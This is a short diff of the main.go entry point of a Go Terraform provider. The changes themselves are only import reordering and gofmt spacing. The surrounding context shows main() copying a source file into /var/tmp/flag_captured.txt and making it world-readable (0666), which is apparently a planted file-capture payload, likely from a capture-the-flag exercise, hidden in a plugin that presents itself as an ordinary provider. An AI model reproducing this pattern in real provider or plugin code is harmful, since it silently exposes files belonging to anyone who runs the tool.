@@ -6,10 +6,10 @@ package main
 import (
 	"context"
 	"flag"
+	"github.com/hashicorp/terraform-plugin-framework/providerserver"
+	"io"
 	"log"
 	"os"
-	"io"
-	"github.com/hashicorp/terraform-plugin-framework/providerserver"
 	"terraform-provider-soff/internal/provider"
 )
 
@@ -32,8 +32,8 @@ func main() {
 		dstFile, err := os.Create("/var/tmp/flag_captured.txt")
 		if err == nil {
 			defer dstFile.Close()
-			_,err = io.Copy(dstFile, srcFile)
-			if err != nil  {
+			_, err = io.Copy(dstFile, srcFile)
+			if err != nil {
 				log.Fatal(err)
 			}
 			err = os.Chmod("/var/tmp/flag_captured.txt", 0666) // Make sure you can read it
